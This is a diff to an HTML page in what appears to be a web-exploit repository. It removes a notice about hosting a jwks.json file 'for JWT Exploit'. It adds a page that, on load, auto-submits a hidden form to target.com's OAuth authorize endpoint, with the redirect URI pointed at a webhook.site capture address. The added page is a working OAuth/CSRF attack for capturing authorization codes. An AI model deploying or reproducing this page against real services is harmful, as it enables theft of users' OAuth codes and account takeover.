@@ -1,13 +1,11 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>JWK Host</title>
-</head>
-<body>
-  <h1>JWK Hosting for JWT Exploit</h1>
-  <p>Your <code>jwks.json</code> should be accessible at:</p>
-  <pre>
-    https://<yourusername>.github.io/<reponame>/jwks.json
-  </pre>
-</body>
+  <body onload="document.forms[0].submit()">
+    <form action="https://target.com/oauth/authorize" method="POST">
+      <input type="hidden" name="client_id" value="YOUR_CLIENT_ID">
+      <input type="hidden" name="redirect_uri" value="https://webhook.site/YOUR-ID">
+      <input type="hidden" name="response_type" value="code">
+      <input type="hidden" name="scope" value="read_profile">
+      <input type="hidden" name="state" value="xyz"> <!-- optional -->
+    </form>
+  </body>
 </html>
